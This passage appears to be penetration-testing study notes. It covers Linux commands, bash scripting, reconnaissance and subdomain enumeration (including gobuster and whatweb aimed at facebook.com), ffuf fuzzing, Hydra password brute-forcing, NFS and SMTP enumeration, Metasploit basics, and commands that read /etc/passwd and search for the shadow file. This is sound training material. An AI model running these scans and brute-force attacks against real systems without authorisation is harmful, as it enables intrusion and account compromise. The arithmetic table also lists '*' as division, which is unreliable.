<td>print newline, word, and byte counts for each file.</td>
</tr>
<tr class="odd">
<td><code>which</code></td>
<td>Locate a command.</td>
</tr>
<tr class="even">
<td><code>id</code></td>
<td>Returns users identity.</td>
</tr>
<tr class="odd">
<td><code>hostname</code></td>
<td>Sets or prints the name of current host system.</td>
</tr>
<tr class="even">
<td><code>uname</code></td>
<td>Prints basic information about the operating system name and system
hardware.</td>
</tr>
<tr class="odd">
<td><code>pwd</code></td>
<td>Returns working directory name.</td>
</tr>
<tr class="even">
<td><code>ifconfig</code></td>
<td>The ifconfig utility is used to assign or to view an address to a
network interface and/or configure network interface parameters.</td>
</tr>
<tr class="odd">
<td><code>ip</code></td>
<td>IP is a utility to show or manipulate routing, network devices,
interfaces and tunnels.</td>
</tr>
<tr class="even">
<td><code>netstat</code></td>
<td>Shows network status.</td>
</tr>
<tr class="odd">
<td><code>ss</code></td>
<td>Another utility to investigate sockets.</td>
</tr>
<tr class="even">
<td><code>ps</code></td>
<td>Shows process status.</td>
</tr>
<tr class="odd">
<td><code>who</code></td>
<td>Displays who are logged in.</td>
</tr>
<tr class="even">
<td><code>env</code></td>
<td>Prints environment or sets and executes command.</td>
</tr>
<tr class="odd">
<td><code>lsblk</code></td>
<td>Lists block devices.</td>
</tr>
<tr class="even">
<td><code>lsusb</code></td>
<td>Lists USB devices.</td>
</tr>
<tr class="odd">
<td><code>lsof</code></td>
<td>Lists opened files.</td>
</tr>
<tr class="even">
<td><code>lspci</code></td>
<td>Lists PCI devices.</td>
</tr>
</tbody>
</table>
<h3 data-number="1.3.2" id="find"><span class="header-section-number">1.3.2</span> FIND</h3>
<p><code>find</code> search for files in a directory hierarchy:</p>
<pre class="shell"><code>$ find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2&gt;/dev/null</code></pre>
<pre><code>*(-type f               = defined the type of the searched object
  -name *.conf          = indicates the name of the object we are looking for
  -user root            = filters all files from a specific user
  -size +20k            = show only files which are larger than 20KiB
  -newermt 2020-03-03   = show only files newer than the specified date
  -exec ls -al {} \;    = this option executes the specified command
  -2&gt;/dev/null          = this redirection ensures that no errors are displayed in the terminal)</code></pre>
<h3 data-number="1.3.3" id="filter-content"><span class="header-section-number">1.3.3</span> Filter Content</h3>
<p><code>less</code> is file pager.</p>
<p><code>sort</code> sort lines of text files.</p>
<p><code>tr</code> translate or delete characters.</p>
<p><code>column</code> columnate lists - to display results in tabular
form use the flag <code>-t</code>.</p>
<p><code>wc</code> print newline, word, and byte counts for each file -
<code>-l</code> prints line counter</p>
<h4 data-number="1.3.3.1" id="grep"><span class="header-section-number">1.3.3.1</span> Grep</h4>
<p><code>grep</code> print lines matching a pattern. If we want to
exclude a result we must use the <code>-v</code> flag.</p>
<h4 data-number="1.3.3.2" id="cut"><span class="header-section-number">1.3.3.2</span> Cut</h4>
<p><code>cut</code> remove sections from each line of files.</p>
<pre class="shell"><code>$ cat /etc/passwd | grep -v &quot;false\|nologin&quot; | cut -d&quot;:&quot; -f1</code></pre>
<pre><code>*(-d &quot;:&quot;     = Sets a delimiter at the character `:`
  -f1        = Selects only this field in our case the first one)</code></pre>
<h3 data-number="1.3.4" id="locate"><span class="header-section-number">1.3.4</span> Locate</h3>
<p><code>locate</code> - find files by name</p>
<p>Update the database for <code>locate</code>:</p>
<pre class="shell"><code>$ sudo updatedb</code></pre>
<p>Search for all files that end with <code>.conf</code></p>
<pre class="shell"><code>$ locate *.conf</code></pre>
<h3 data-number="1.3.5" id="file-descriptors"><span class="header-section-number">1.3.5</span> File Descriptors</h3>
<ol type="1">
<li>Data Stream for Input</li>
</ol>
<ul>
<li>STDIN - 0</li>
</ul>
<ol start="2" type="1">
<li>Data Stream for Output</li>
</ol>
<ul>
<li>STDOUT - 1</li>
</ul>
<ol start="3" type="1">
<li>Data Stream for Output that relates to an error occurring.</li>
</ol>
<ul>
<li>STDERR – 2</li>
</ul>
<p>If we want to discard for example all errors and redirect the data
into a file we can use:</p>
<pre class="shell"><code>$ find /etc/ -name shadow 2&gt; stderr.txt 1&gt; stdout.txt</code></pre>
<h2 data-number="1.4" id="bash-scripting"><span class="header-section-number">1.4</span> Bash Scripting</h2>
<p>If we want to execute a bash script we can do this by the following
command:</p>
<pre class="shell"><code>$ &lt;interpreter&gt; script.sh &lt;optional arguments&gt;</code></pre>
<p>Run a bash script with persistent permissions (<code>-p</code>):</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ./bashscript <span class="at">-p</span></span></code></pre></div>
<p>In the first line we can specify the interpreter but if we call the
script with another one, the defined in the <code>shebang</code> will be
ignored:</p>
<pre class="shell"><code>#!/bin/bash</code></pre>
<p>This is also possible with other scripting languages like Python
<code>#!/usr/bin/env python</code>. ### Conditional Execution</p>
<p>The rough basic structure is as follows:</p>
<pre class="shell"><code>if [[ -z &quot;$string&quot; ]]; then
  echo &quot;String is empty&quot;
elif [[ -n &quot;$string&quot; ]]; then
  echo &quot;String is not empty&quot;
fi</code></pre>
<h4 data-number="1.4.0.1" id="operators"><span class="header-section-number">1.4.0.1</span> Operators</h4>
<p>String comparison operators “<code>&lt;</code> / <code>&gt;</code>”
<strong>works only</strong> within the double square brackets
<code>[[ &lt;condition&gt; ]]</code>.</p>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>[[ -z STRING ]]</code></td>
<td>Empty string</td>
</tr>
<tr class="even">
<td><code>[[ -n STRING ]]</code></td>
<td>Not empty string</td>
</tr>
<tr class="odd">
<td><code>[[ STRING == STRING ]]</code></td>
<td>Equal</td>
</tr>
<tr class="even">
<td><code>[[ STRING != STRING ]]</code></td>
<td>Not Equal</td>
</tr>
<tr class="odd">
<td><code>[[ NUM -eq NUM ]]</code></td>
<td>Equal</td>
</tr>
<tr class="even">
<td><code>[[ NUM -ne NUM ]]</code></td>
<td>Not equal</td>
</tr>
<tr class="odd">
<td><code>[[ NUM -lt NUM ]]</code></td>
<td>Less than</td>
</tr>
<tr class="even">
<td><code>[[ NUM -le NUM ]]</code></td>
<td>Less than or equal</td>
</tr>
<tr class="odd">
<td><code>[[ NUM -gt NUM ]]</code></td>
<td>Greater than</td>
</tr>
<tr class="even">
<td><code>[[ NUM -ge NUM ]]</code></td>
<td>Greater than or equal</td>
</tr>
<tr class="odd">
<td><code>[[ -o noclobber ]]</code></td>
<td>If OPTIONNAME is enabled</td>
</tr>
<tr class="even">
<td><code>[[ ! EXPR ]]</code></td>
<td>Not</td>
</tr>
<tr class="odd">
<td><code>[[ X &amp;&amp; Y ]]</code></td>
<td>And</td>
</tr>
<tr class="even">
<td><code>[[ X || Y ]]</code></td>
<td>Or</td>
</tr>
<tr class="odd">
<td><code>[[ STRING =~ STRING ]]</code></td>
<td>Regexp</td>
</tr>
<tr class="even">
<td><code>(( NUM &lt; NUM ))</code></td>
<td>Numeric conditions</td>
</tr>
</tbody>
</table>
<h4 data-number="1.4.0.2" id="file-operators"><span class="header-section-number">1.4.0.2</span> File Operators</h4>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>[[ -e FILE ]]</code></td>
<td>Exists</td>
</tr>
<tr class="even">
<td><code>[[ -r FILE ]]</code></td>
<td>Readable</td>
</tr>
<tr class="odd">
<td><code>[[ -h FILE ]]</code></td>
<td>Symlink</td>
</tr>
<tr class="even">
<td><code>[[ -d FILE ]]</code></td>
<td>Directory</td>
</tr>
<tr class="odd">
<td><code>[[ -w FILE ]]</code></td>
<td>Writable</td>
</tr>
<tr class="even">
<td><code>[[ -s FILE ]]</code></td>
<td>Size is &gt; 0 bytes</td>
</tr>
<tr class="odd">
<td><code>[[ -f FILE ]]</code></td>
<td>File</td>
</tr>
<tr class="even">
<td><code>[[ -x FILE ]]</code></td>
<td>Executable</td>
</tr>
<tr class="odd">
<td><code>[[ FILE1 -nt FILE2 ]]</code></td>
<td>1 is more recent than 2</td>
</tr>
<tr class="even">
<td><code>[[ FILE1 -ot FILE2 ]]</code></td>
<td>2 is more recent than 1</td>
</tr>
<tr class="odd">
<td><code>[[ FILE1 -ef FILE2 ]]</code></td>
<td>Same files</td>
</tr>
</tbody>
</table>
<h3 data-number="1.4.1" id="arguments"><span class="header-section-number">1.4.1</span> Arguments</h3>
<p>It is possible to pass up to 9 arguments
(<code>$0</code>-<code>$9</code>) to a script:</p>
<pre class="shell"><code>            $ ./script.sh ARG1 ARG2 ARG3 ... ARG9
ASSIGNMENTS:       $0      $1   $2   $3 ...   $9</code></pre>
<h3 data-number="1.4.2" id="special-variables"><span class="header-section-number">1.4.2</span> Special Variables</h3>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>$#</code></td>
<td>This variable holds the number of arguments passed to the
script.</td>
</tr>
<tr class="even">
<td><code>$@</code></td>
<td>This variable can be used to retrieve the list of command-line
arguments.</td>
</tr>
<tr class="odd">
<td><code>$n</code></td>
<td>Each command-line argument can be selectively retrieved using its
position. For example, the first argument is found at
<code>$1</code>.</td>
</tr>
<tr class="even">
<td><code>$$</code></td>
<td>The process ID of the currently executing process.</td>
</tr>
<tr class="odd">
<td><code>$?</code></td>
<td>The exit status of the script. This variable is useful to determine
a command’s success. The value 0 represents successful execution, while
1 is a result of a failure.</td>
</tr>
</tbody>
</table>
<h3 data-number="1.4.3" id="variables"><span class="header-section-number">1.4.3</span> Variables</h3>
<p>It is important that when assigning a variable there is <strong>no
space</strong> around the equal sign:</p>
<pre class="shell"><code>variable=&quot;test&quot;</code></pre>
<h3 data-number="1.4.4" id="arrays"><span class="header-section-number">1.4.4</span> Arrays</h3>
<p>The values in the array are separated by spaces. If we want to escape
these spaces, we can use single quotes (<code>&#39;</code>…<code>&#39;</code>)
or double quotes (<code>&quot;</code>…<code>&quot;</code>).</p>
<pre class="shell"><code>#!/bin/bash

domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)

echo ${domains[0]}</code></pre>
<h3 data-number="1.4.5" id="arithmetic"><span class="header-section-number">1.4.5</span> Arithmetic</h3>
<table>
<thead>
<tr class="header">
<th>Operator</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>+</code></td>
<td>Addition</td>
</tr>
<tr class="even">
<td><code>-</code></td>
<td>Subtraction</td>
</tr>
<tr class="odd">
<td><code>*</code></td>
<td>Division</td>
</tr>
<tr class="even">
<td><code>%</code></td>
<td>Modulus</td>
</tr>
<tr class="odd">
<td><code>variable++</code></td>
<td>Increase the value of the variable by 1</td>
</tr>
<tr class="even">
<td><code>variable--</code></td>
<td>Decrease the value of the variable by 1</td>
</tr>
</tbody>
</table>
<p>We can also calculate the length of the variable. Using this function
<code>${#variable}</code>, every character gets counted, and we get the
total number of characters in the variable.</p>
<h3 data-number="1.4.6" id="input-control"><span class="header-section-number">1.4.6</span> Input Control</h3>
<p>Read input from the user, while the script is running:</p>
<pre class="shell"><code>read -p &quot;Select your option: &quot; opt</code></pre>
<pre><code>*(-p    = Ensures that our input remains on the same line
  opt   = The input will be stored in the variable opt)</code></pre>
<h3 data-number="1.4.7" id="output-control"><span class="header-section-number">1.4.7</span> Output Control</h3>
<p>In some cases the scripts take longer time and the user don’t have
any feedback. To solve this problem we can use <code>tee</code>, which
enables us to write something to a file and also returning it as
standard output:</p>
<pre class="shell"><code>netrange=$(whois $ip | grep &quot;NetRange\|CIDR&quot; | tee -a CIDR.txt)</code></pre>
<pre><code>*(-a   = Append to the given FILEs, do not overwrite)</code></pre>
<h3 data-number="1.4.8" id="loops"><span class="header-section-number">1.4.8</span> Loops</h3>
<h4 data-number="1.4.8.1" id="for-loops"><span class="header-section-number">1.4.8.1</span> For Loops</h4>
<p>The idea behind for loops is that we iterate over something, or we
have a limit how often the loop should run.</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>for $variable in 1 2 3 4
do
    echo $variable
done


for $variable in file1 file2 file3
do
    echo $variable
done


for ip in &quot;10.10.10.170 10.10.10.174 10.10.10.175&quot;
do
    ping -c 1 $ip
done</code></pre>
<h4 data-number="1.4.8.2" id="while-loops"><span class="header-section-number">1.4.8.2</span> While Loops</h4>
<p>The while loop will be executed as long the condition is fulfilled.
There are two keywords available which gives us more control over the
while loop.</p>
<ul>
<li><code>break</code> → Interrupts the loop</li>
<li><code>continue</code> → Immediately continues with the next loop
run</li>
</ul>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>#!/bin/bash

counter=0

while [ $counter -lt 10 ]
do
  # Increase $counter by 1
  ((counter++))
  echo &quot;Counter: $counter&quot;

  if [ $counter == 2 ]
  then
    continue
  elif [ $counter == 4 ]
  then
    break
  fi
done</code></pre>
<h4 data-number="1.4.8.3" id="until-loops"><span class="header-section-number">1.4.8.3</span> Until Loops</h4>
<p>Nevertheless, the until loop works precisely like the while loop, but
with the difference:</p>
<ul>
<li>The code inside an until loop is executed as long as the particular
condition is false</li>
</ul>
<h3 data-number="1.4.9" id="switch-case"><span class="header-section-number">1.4.9</span> Switch case</h3>
<p>The keyword for a switch-case-statement starts with the keyword
<code>case</code>, followed by the variable or value as an expression,
which is then compared in the pattern. If the variable or value matches
the expression, then the statements are executed after the parenthesis
and ended with a double semicolon (<code>;;</code>).</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>read -p &quot;Select your option: &quot; opt

case $opt in
    &quot;1&quot;) network_range ;;
    &quot;2&quot;) ping_host ;;
    &quot;3&quot;) network_range &amp;&amp; ping_host ;;
    &quot;*&quot;) exit 0 ;;
esac</code></pre>
<h3 data-number="1.4.10" id="functions"><span class="header-section-number">1.4.10</span> Functions</h3>
<p>The definition of a function is at the beginning of a bash script
this ensures that it is already defined before it is called.</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code># Method 1 - Functions

function name {
    &lt;commands&gt;
}

# Method 2 - Functions

name() {
    &lt;commands&gt;
}</code></pre>
<p>The function is called only by calling the specified name of the
function.</p>
<h4 data-number="1.4.10.1" id="parameter-passing"><span class="header-section-number">1.4.10.1</span> Parameter Passing</h4>
<p>In principle, the same applies to the passed parameters as to
parameters passed to a shell script. These are <code>$1</code> -
<code>$9</code> (<code>${n}</code>), or <code>$variable</code> as we
have already seen. Each function has its own set of parameters. So they
do not collide with those of other functions or the parameters of the
shell script</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>#!/bin/bash

function print_pars {
    echo $1 $2 $3
}

one=&quot;First parameter&quot;
two=&quot;Second parameter&quot;
three=&quot;Third parameter&quot;

print_pars &quot;$one&quot; &quot;$two&quot; &quot;$three&quot;</code></pre>
<h4 data-number="1.4.10.2" id="return-values"><span class="header-section-number">1.4.10.2</span> Return Values</h4>
<p>Like our bash script, the functions return status codes:</p>
<table>
<thead>
<tr class="header">
<th>Return Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>1</code></td>
<td>General errors</td>
</tr>
<tr class="even">
<td><code>2</code></td>
<td>Misuse of shell builtins</td>
</tr>
<tr class="odd">
<td><code>126</code></td>
<td>Command invoked cannot execute</td>
</tr>
<tr class="even">
<td><code>127</code></td>
<td>Command not found</td>
</tr>
<tr class="odd">
<td><code>128</code></td>
<td>Invalid argument to exit</td>
</tr>
<tr class="even">
<td><code>128+n</code></td>
<td>Fatal error signal “<code>n</code>”</td>
</tr>
<tr class="odd">
<td><code>130</code></td>
<td>Script terminated by Control-C</td>
</tr>
<tr class="even">
<td><code>255\*</code></td>
<td>Exit status out of range</td>
</tr>
</tbody>
</table>
<p>To get the value of a function back, we can use several methods like
<code>return</code>, <code>echo</code>, or a <code>variable</code>.</p>
<p><em>Syntax - Examples</em></p>
<pre class="shell"><code>#!/bin/bash

function given_args {

        if [ $# -lt 1 ]
        then
                echo -e &quot;Number of arguments: $#&quot;
                return 1
        else
                echo -e &quot;Number of arguments: $#&quot;
                return 0
        fi
}

# No arguments given
given_args
echo -e &quot;Function status code: $?\n&quot;

# One argument given
given_args &quot;argument&quot;
echo -e &quot;Function status code: $?\n&quot;

# Pass the results of the funtion into a variable
content=$(given_args &quot;argument&quot;)

echo -e &quot;Content of the variable: \n\t$content&quot;</code></pre>
<h3 data-number="1.4.11" id="debugging"><span class="header-section-number">1.4.11</span> Debugging</h3>
<p>Bash allows us to debug our code by using the “<code>-x</code>”
(<code>xtrace</code>) and “<code>-v</code>” (<code>verbose</code>)
options.</p>
<h3 data-number="1.4.12" id="cheat-sheet"><span class="header-section-number">1.4.12</span> Cheat Sheet</h3>
<p>For more information about bash scripting have a look in the
following cheat sheet: <a href="https://devhints.io/bash">devhints</a></p>
<h2 data-number="1.5" id="information-gathering"><span class="header-section-number">1.5</span> Information Gathering</h2>
<h3 data-number="1.5.1" id="passive-information-gathering"><span class="header-section-number">1.5.1</span> Passive Information
Gathering</h3>
<p><code>whois</code> can be used for querying domain names, IP
addresses, or autonomous systems.</p>
<h4 data-number="1.5.1.1" id="dig"><span class="header-section-number">1.5.1.1</span> DIG</h4>
<p><code>dig</code> is a DNS lookup utility.</p>
<p><code>WaybackMachine</code> is an American digital library that
provides free public access to digitalized materials, including
websites, collected automatically via its web crawlers.</p>
<pre class="shell"><code>$ dig any google.com @8.8.8.8</code></pre>
<pre><code>*(any         = query all types of records
  @8.8.8.8    = define a dns server from which you wnat to retrieve the information)</code></pre>
<h4 data-number="1.5.1.2" id="project-sonar"><span class="header-section-number">1.5.1.2</span> Project Sonar</h4>
<p>To find all available subdomains we can use
<code>Project Sonar</code>:</p>
<pre class="shell"><code>$ export TARGET=&quot;facebook.com&quot;
$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r &#39;.[]&#39; | sort -u</code></pre>
<h4 data-number="1.5.1.3" id="certificates"><span class="header-section-number">1.5.1.3</span> Certificates</h4>
<p>To gain more information we can search for certificates at sites like
<a href="https://crt.sh">crt.sh</a> and <a href="https://search.censys.io/certificates">search.censys.io</a>.</p>
<h3 data-number="1.5.2" id="active-information-gathering"><span class="header-section-number">1.5.2</span> Active Information
Gathering</h3>
<p><code>Wappalyzer</code> is a browser extension which finds out what
technologies are used on a website.</p>
<p><code>WAFW00F</code> is a Web Application Firewall Fingerprinting
Tool.</p>
<p><code>Aquatone</code> is a tool for visual inspection of websites
across a large amount of hosts and is convenient for quickly gaining an
overview of HTTP-based attack surface.</p>
<h4 data-number="1.5.2.1" id="whatweb"><span class="header-section-number">1.5.2.1</span> WhatWeb</h4>
<p><code>WhatWeb</code> is a Web scanner - identify technologies used by
websites.</p>
<pre class="shell"><code>$ whatweb -a 1 https://www.facebook.com -v</code></pre>
<pre><code>*(-a    = Set the aggression level. 1(low) - 4(high) 
  -v    = verbose)</code></pre>
<h4 data-number="1.5.2.2" id="active-subdomain-enumeration-zone-transfer"><span class="header-section-number">1.5.2.2</span> Active Subdomain
Enumeration (Zone transfer)</h4>
<ol type="1">
<li><p>Identifying Nameservers:
<code>shell     nslookup -type=NS &lt;target&gt;</code></p></li>
<li><p>Testing for <code>ANY</code> and <code>AXFR</code> Zone Transfer:
<code>shell     nslookup -type=any -query=AXFR &lt;target&gt; &lt;nameserver&gt;</code></p></li>
</ol>
<h4 data-number="1.5.2.3" id="gobuster---dns"><span class="header-section-number">1.5.2.3</span> Gobuster - DNS</h4>
<p>First we need to create our pattern file, which is described in
Project Sonar section. Now we can export the parameters and run the
<code>gobuster</code> command.</p>
<pre class="shell"><code>$ export TARGET=&quot;facebook.com&quot;
$ export NS=&quot;d.ns.facebook.com&quot;
$ export WORDLIST=&quot;numbers.txt&quot;
$ gobuster dns -q -r &quot;${NS}&quot; -d &quot;${TARGET}&quot; -w &quot;${WORDLIST}&quot; -p ./patterns.txt -o &quot;gobuster_${TARGET}.txt&quot;</code></pre>
<pre class="text"><code>*(-q   = Don&#39;t print the banner and other noise
  -r   = Use custom DNS server
  -d   = A target domain name
  -p   = Path to the patterns file
  -w   = Path to the wordlist
  -o   = Output file)</code></pre>
<h2 data-number="1.6" id="ffuf"><span class="header-section-number">1.6</span> ffuf</h2>
<p><code>ffuf</code> is a fest web fuzzer written in Go that allows
typical directory discovery, virtual host discovery (without DNS
records) and GET and POST parameter fuzzing.</p>
<h3 data-number="1.6.1" id="performance"><span class="header-section-number">1.6.1</span> Performance</h3>
<p>To increase the speed of <code>ffuf</code> we can increase the number
of threads with the <code>-t</code> flag, but it is important that we
don’t give <code>ffuf</code> too much power because it could lead in a
<code>DoS</code>.</p>
<pre class="shell"><code>$ ffuf -w &lt;SNIP&gt; -u &lt;SNIP&gt; -t 200</code></pre>
<h3 data-number="1.6.2" id="directory-fuzzing"><span class="header-section-number">1.6.2</span> Directory Fuzzing</h3>
<p>With the <code>-w</code> flag we can pass our wordlist, with
<code>-u</code> the URL we want to fuzz. To tell <code>ffuf</code> where
we want to fuzz, we need to place the <code>FUZZ</code> keyword this can
look like the following command:</p>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></pre>
<h3 data-number="1.6.3" id="page-fuzzing"><span class="header-section-number">1.6.3</span> Page Fuzzing</h3>
<p>If we want, we can combine two keywords in one search. For that we
can use <code>FUZZ_1.FUZZ_2</code>. #### Extension Fuzzing</p>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ</code></pre>
<h4 data-number="1.6.3.1" id="page-fuzzing-1"><span class="header-section-number">1.6.3.1</span> Page Fuzzing</h4>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></pre>
<h3 data-number="1.6.4" id="recursive-fuzzing"><span class="header-section-number">1.6.4</span> Recursive Fuzzing</h3>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></pre>
<pre class="text"><code>*(-recursion              = scans the directory recursive
  -recursion-depth 1      = only fuzz the current directory and their direct sub-directories
  -e .php                 = specify the extension
  -v                      = output the full URLs)</code></pre>
<h3 data-number="1.6.5" id="subdomain-fuzzing"><span class="header-section-number">1.6.5</span> Subdomain Fuzzing</h3>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/</code></pre>
<h3 data-number="1.6.6" id="vhost-fuzzing"><span class="header-section-number">1.6.6</span> Vhost Fuzzing</h3>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H &#39;Host: FUZZ.example.com&#39; -fs xxx</code></pre>
<pre><code>*(-H &#39;Host: FUZZ.example.com&#39; = Header `&quot;Name: Value&quot;`, separated by colon
  -fs xxx                     = filter all incorrect results)</code></pre>
<h3 data-number="1.6.7" id="parameter-fuzzing"><span class="header-section-number">1.6.7</span> Parameter Fuzzing</h3>
<h4 data-number="1.6.7.1" id="get-request"><span class="header-section-number">1.6.7.1</span> GET Request</h4>
<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></pre>
<pre><code>*(-fs xxx   = filter all incorrect results)</code></pre>
<h4 data-number="1.6.7.2" id="post-request"><span class="header-section-number">1.6.7.2</span> POST Request</h4>
<pre class="shell"><code>$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></pre>
<pre><code>*(-X                          = HTTP method to use
  -d                          = POST data
  -H &#39;Host: FUZZ.example.com&#39; = Header `&quot;Name: Value&quot;`, separated by colon
  -fs xxx                     = filter all incorrect results)</code></pre>
<h4 data-number="1.6.7.3" id="value-fuzzing"><span class="header-section-number">1.6.7.3</span> Value Fuzzing</h4>
<pre class="shell"><code>$ ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></pre>
<pre><code>*(-X                          = HTTP method to use
  -d                          = POST data
  -H &#39;Host: FUZZ.example.com&#39; = Header `&quot;Name: Value&quot;`, separated by colon
  -fs xxx                     = filter all incorrect results)</code></pre>
<h2 data-number="1.7" id="exploiting-network-services"><span class="header-section-number">1.7</span> Exploiting Network
Services</h2>
<h3 data-number="1.7.1" id="github-repos"><span class="header-section-number">1.7.1</span> GitHub Repos</h3>
<p>[SecLists] (https://github.com/danielmiessler/SecLists) <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></p>
<h3 data-number="1.7.2" id="ssh"><span class="header-section-number">1.7.2</span> SSH</h3>
<p>Authenticate via ssh with the key-file <code>id_rsa</code>:</p>
<div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
<pre class="text"><code>*(-i [file]  = Identity file)</code></pre>
<h3 data-number="1.7.3" id="nmap"><span class="header-section-number">1.7.3</span> NMAP</h3>
<p>Checks open ports in defined range and check running services with
<code>Nmap</code>:</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p-</span> <span class="at">-v</span></span></code></pre></div>
<pre class="text"><code>*(-p-  = Scans the whole portrange
  -v   = verbose
  -p   = Specific port or portrange
  -sV  = Attempts to determine the version of the service running on port
  -A   = Enables OS detection, version detection, script scanning and traceroute)</code></pre>
<h3 data-number="1.7.4" id="ftp"><span class="header-section-number">1.7.4</span> FTP</h3>
<p>Download a File from an FTP-Server with <code>Wget</code>:</p>
<div class="sourceCode" id="cb53"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
<pre class="text"><code>*(-m = --mirror)</code></pre>
<h4 data-number="1.7.4.1" id="hydra"><span class="header-section-number">1.7.4.1</span> Hydra</h4>
<p>Use <code>Hydra</code> for cracking password in our example on an
FTP-Service:</p>
<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
<pre class="text"><code>*(-t 4      = Number of parallel connections per target
  -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
  -P [file] = Points to the file containing the list of possible passwords
  -vV       = Very verbose: shows the login+pass combination for each attempt
  [IP]      = The IP address of the target machine
  [ftp]     = Sets the protocol)</code></pre>
<p>On PHP</p>
<pre class="shell"><code>hydra -l admin -P /usr/shared/rockyou.txt &lt;ip&gt; http-post-form &quot;/login.php?username=^USER^&amp;password=^PASS^:F=Invalid Username or Password&quot;</code></pre>
<pre class="shell"><code>hydra http-post-form -U # For help</code></pre>
<h3 data-number="1.7.5" id="nfs"><span class="header-section-number">1.7.5</span> NFS</h3>
<p>List name or <code>NFS</code> shares:</p>
<div class="sourceCode" id="cb59"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="#cb59-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
<pre class="text"><code>*(-e    = Shows the NSF server&#39;s export list
  [IP]  = The IP Address of the NFS server)</code></pre>
<p>Connect <code>NFS</code> share with mount point on our machine:</p>
<div class="sourceCode" id="cb61"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb61-1"><a href="#cb61-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo mount <span class="at">-t</span> nfs IP:share /tmp/mount/ <span class="at">-nolock</span></span></code></pre></div>
<pre class="text"><code>*(-t nfs    = Type of device to mount, then specifying that it&#39;s NFS
  IP:share  = The IP Address of the NFS server, and the name of the share we wish to mount
  -nolock   = Specifies not to use NLM locking)</code></pre>
<h3 data-number="1.7.6" id="smtp"><span class="header-section-number">1.7.6</span> SMTP</h3>
<p>There are three relevant commands, when it comes to
<code>SMTP</code>:</p>
<pre class="text"><code>(VRFY    = Confirming the names of valid users
 EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
 RCPT TO = Specifies the e-mail address of the recipient)</code></pre>
<h3 data-number="1.7.7" id="metasploit"><span class="header-section-number">1.7.7</span> Metasploit</h3>
<pre class="text"><code>*(search [name]                 = Search for a module and his description
  use [name]                    = Selects a module by name
  options                       = When a module is selected we will see the options of the module
  set [option] [parameter]      = Set a specific option with a specific parameter
  run                           = Run the exploit)</code></pre>
